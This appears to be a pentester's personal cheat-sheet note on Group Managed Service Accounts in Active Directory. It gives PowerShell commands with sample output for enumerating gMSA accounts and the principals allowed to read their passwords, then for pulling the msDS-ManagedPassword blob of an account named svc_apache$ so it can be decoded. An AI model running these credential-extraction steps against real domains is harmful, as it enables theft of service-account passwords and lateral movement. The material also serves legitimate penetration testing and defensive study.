Group Managed Service Accounts (gMSA’s) can be used to *run Windows services over multiple servers within the Windows domain*.
https://aadinternals.com/post/gmsa/

# Detection/Enumeration
## Method 1: Bloodhound
![[Pasted image 20240528205214.png]]

## Method 2
```powershell
# Get gmsaADFS account:
Get-ADServiceAccount -Identity gmsaADFS -Properties "msDS-ManagedPassword"

DistinguishedName    : CN=gmsaADFS,CN=Managed Service Accounts,DC=aadinternals,DC=com
Enabled              : True
Name                 : gmsaADFS
ObjectClass          : msDS-GroupManagedServiceAccount
ObjectGUID           : b3a4f131-bb4f-4bf4-9e54-3d54b285620b
SamAccountName       : gmsaADFS$
SID                  : S-1-5-21-2918793985-2280761178-2512057791-2103
UserPrincipalName    : 


# Get principals allowed to get gmsaADFS account password:
Get-ADServiceAccount -Identity gmsaADFS -Properties "PrincipalsAllowedToRetrieveManagedPassword" | Select PrincipalsAllowedToRetrieveManagedPassword

PrincipalsAllowedToRetrieveManagedPassword   
------------------------------------------   
{CN=ADFS,CN=Computers,DC=aadinternals,DC=com}


# Get AD object for the ADFS principal
Get-ADObject -Identity "CN=ADFS,CN=Computers,DC=aadinternals,DC=com"

DistinguishedName                           Name ObjectClass ObjectGUID        
-----------------                           ---- ----------- ----------        
CN=ADFS,CN=Computers,DC=aadinternals,DC=com ADFS computer    bb5a6e8a-2956-4...
```

---
# Hunt Password
## Method 1
Take the **current value** always!
https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword

## Method 2
```powershell
# Test
Get-ADServiceAccount -Identity 'svc_apache$' -Properties "msDS-ManagedPassword"

# Get all the values (Replace \n with ,) & Decode with gmsadecode.py
(Get-ADServiceAccount -Identity 'svc_apache$' -Properties 'msDS-ManagedPassword').'msDS-ManagedPassword'
```